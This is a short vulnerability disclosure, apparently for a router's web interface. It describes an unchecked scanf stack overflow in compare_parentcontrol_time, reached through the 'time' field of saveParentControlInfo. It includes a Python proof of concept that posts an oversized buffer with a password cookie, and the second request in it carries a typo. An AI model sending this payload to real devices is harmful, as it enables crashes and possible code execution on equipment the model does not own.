In the function compare_parentcontrol_time, the program retrieves content from the parameter 'time' and passes it to the variable s created by the program, with the variable's value being passed via scanf. There is no size check, which leads to a stack overflow vulnerability. An attacker can easily execute arbitrary code or cause a denial of service attack using carefully crafted overflow data.

<img width="415" height="340" alt="image" src="https://github.com/user-attachments/assets/735b5a28-39eb-457f-a592-c93279d0a65c" />


POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/saveParentControlInfo"

cookie = {"Cookie":"password=12345"}
data = {"time": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, caookies=cookie, data=data)
print(response.text)
```
